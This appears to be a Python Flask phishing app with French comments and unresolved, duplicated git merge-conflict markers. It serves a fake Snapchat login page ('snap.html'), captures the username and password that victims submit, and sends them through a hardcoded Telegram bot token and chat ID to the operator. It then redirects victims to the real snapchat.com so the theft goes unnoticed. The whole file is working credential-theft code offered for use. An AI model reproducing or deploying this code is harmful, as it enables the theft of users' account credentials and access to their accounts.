<<<<<<< HEAD
from flask import Flask, request, jsonify, redirect, url_for, render_template
import requests
import os 

# Assurez-vous d'avoir 'render_template' dans les imports
# Si vous aviez importé 'os', assurez-vous qu'il soit utilisé (voir ci-dessous)

app = Flask(__name__)

# --- VARIABLES DE CONFIGURATION ---
# Pour un déploiement stable sur Render, il est préférable d'utiliser les variables d'environnement.
# Si elles ne sont pas définies (test local), utilisez les valeurs par défaut.
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8556128794:AAE5e_vJogpX4QKD1-RjqE-CpINUk6EDKUM')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1949276292')
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# URL vers laquelle rediriger l'utilisateur après la soumission
URL_DE_REDIRECTION = "https://www.snapchat.com/" 

# --- FIN DES VARIABLES DE CONFIGURATION ---


# 1. ROUTE POUR AFFICHER LE FORMULAIRE HTML (CORRECTION DE L'ERREUR 404)
# Quand l'utilisateur va sur l'adresse de base (/)
@app.route('/')
def index():
    # Flask cherche 'index.html' dans le dossier 'templates'
    return render_template('snap.html') 


# 2. ROUTE DE TRAITEMENT DU FORMULAIRE (CORRECTION DE LA SYNTAXE)
@app.route('/traitement_connexion', methods=['POST'])
def handle_login_data():
    
    # Réception et extraction des données via l'attribut 'name' des champs HTML
    data = request.form
    # Clés basées sur votre correction : 'id_29' pour l'utilisateur, 'id_30' pour le mot de passe
    username_recu = data.get('id_29', 'Utilisateur_NON_SAISI') 
    password_recu = data.get('id_30', 'Mot_de_passe_NON_SAISI') 

    # --- LOGIQUE D'ENVOI À TELEGRAM ---
    message_a_envoyer = (
        f"🚨 NOUVELLE CONNEXION 🚨\n\n"
        f"👤 Identifiant: {username_recu}\n"
        f"🔑 Mot de passe: {password_recu}\n"
        f"🌐 Source: Formulaire de connexion simulé"
    )
    
    payload = {
        'chat_id': TELEGRAM_CHAT_ID, # Utilise la variable configurée en haut
        'text': message_a_envoyer
    }
    
    try:
        # Envoi de la requête POST à l'API Telegram
        requests.post(TELEGRAM_API_URL, data=payload)
    
    except requests.exceptions.RequestException as e:
        print(f"[NETWORK ERROR] Échec de la connexion à l'API Telegram: {e}") 

    # 3. REDIRECTION
    return redirect(URL_DE_REDIRECTION, code=302) 

    
if __name__ == '__main__':
    # Lance le serveur Flask en mode local
=======
from flask import Flask, request, jsonify, redirect, url_for, render_template
import requests
import os 

# Assurez-vous d'avoir 'render_template' dans les imports
# Si vous aviez importé 'os', assurez-vous qu'il soit utilisé (voir ci-dessous)

app = Flask(__name__)

# --- VARIABLES DE CONFIGURATION ---
# Pour un déploiement stable sur Render, il est préférable d'utiliser les variables d'environnement.
# Si elles ne sont pas définies (test local), utilisez les valeurs par défaut.
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8556128794:AAE5e_vJogpX4QKD1-RjqE-CpINUk6EDKUM')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1949276292')
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# URL vers laquelle rediriger l'utilisateur après la soumission
URL_DE_REDIRECTION = "https://www.snapchat.com/" 

# --- FIN DES VARIABLES DE CONFIGURATION ---


# 1. ROUTE POUR AFFICHER LE FORMULAIRE HTML (CORRECTION DE L'ERREUR 404)
# Quand l'utilisateur va sur l'adresse de base (/)
@app.route('/')
def index():
    # Flask cherche 'index.html' dans le dossier 'templates'
    return render_template('snap.html') 


# 2. ROUTE DE TRAITEMENT DU FORMULAIRE (CORRECTION DE LA SYNTAXE)
@app.route('/traitement_connexion', methods=['POST'])
def handle_login_data():
    
    # Réception et extraction des données via l'attribut 'name' des champs HTML
    data = request.form
    # Clés basées sur votre correction : 'id_29' pour l'utilisateur, 'id_30' pour le mot de passe
    username_recu = data.get('id_29', 'Utilisateur_NON_SAISI') 
    password_recu = data.get('id_30', 'Mot_de_passe_NON_SAISI') 

    # --- LOGIQUE D'ENVOI À TELEGRAM ---
    message_a_envoyer = (
        f"🚨 NOUVELLE CONNEXION 🚨\n\n"
        f"👤 Identifiant: {username_recu}\n"
        f"🔑 Mot de passe: {password_recu}\n"
        f"🌐 Source: Formulaire de connexion simulé"
    )
    
    payload = {
        'chat_id': TELEGRAM_CHAT_ID, # Utilise la variable configurée en haut
        'text': message_a_envoyer
    }
    
    try:
        # Envoi de la requête POST à l'API Telegram
        requests.post(TELEGRAM_API_URL, data=payload)
    
    except requests.exceptions.RequestException as e:
        print(f"[NETWORK ERROR] Échec de la connexion à l'API Telegram: {e}") 

    # 3. REDIRECTION
    return redirect(URL_DE_REDIRECTION, code=302) 

    
if __name__ == '__main__':
    # Lance le serveur Flask en mode local
>>>>>>> 7fb4ce016a8c8c05074cca9bbf3af63e730999fb
    app.run(debug=True, host='0.0.0.0')